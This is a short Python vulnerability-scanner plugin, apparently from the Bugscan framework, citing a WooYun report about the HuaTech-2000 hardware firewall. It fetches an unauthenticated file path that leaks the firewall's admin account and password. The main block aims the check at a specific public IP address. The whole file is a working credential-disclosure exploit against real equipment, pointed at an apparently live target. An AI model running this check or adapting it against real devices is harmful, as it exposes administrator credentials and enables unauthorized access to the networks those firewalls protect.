#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2015-0129555
import urlparse
def assign(service, arg):
    if service == 'zhongruan_firewall':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'definition/temp/user.txt'
    code, head, res, errcode, _ = curl.curl2(url)
    if code==200 and 'admin;' in res:
        security_hole("中软HuaTech-2000硬件防火墙账号密码：%s"%url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('zhongruan_firewall', 'https://120.194.4.130/')[1])